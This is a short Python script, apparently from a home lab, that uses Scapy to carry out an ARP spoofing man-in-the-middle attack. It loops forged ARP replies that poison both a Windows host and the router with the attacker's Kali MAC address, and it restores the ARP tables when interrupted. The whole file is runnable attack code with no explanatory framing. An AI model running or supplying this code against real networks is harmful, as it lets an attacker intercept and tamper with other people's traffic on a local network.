from scapy.all import *
def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.100.2" #Ip windows
    arp_response.hwdst = "d0:37:45:ee:0c:73" # MAC windows
    arp_response.hwsrc = "00:0c:29:78:0b:65" # MAC kali
    arp_response.psrc = "192.168.100.1" # router

    send(arp_response)

def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.100.1" #IP router
    arp_response.hwdst = "d4:46:49:2a:64:53" # MAC router
    arp_response.hwsrc = "00:0c:29:78:0b:65" # MAC kali
    arp_response.psrc = "192.168.100.2" #IP windows

    send(arp_response)

def restore():

    # restoring router table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.100.1" #IP router
    arp_response.hwdst = "d4:46:49:2a:64:53" # MAC router
    arp_response.hwsrc = "d0:37:45:ee:0c:73" # MAC wndows
    arp_response.psrc = "192.168.100.2" #IP windows
    send(arp_response)


    #restoring windows table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.100.2" #IP windows
    arp_response.hwdst = "d0:37:45:ee:0c:73" # MAC wndows
    arp_response.hwsrc = "d4:46:49:2a:64:53" # MAC router
    arp_response.psrc = "192.168.100.1" #IP router
    send(arp_response)


	

if __name__ == "__main__":
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("Restaurando ARP")
        restore()
        print("Saliendo") 

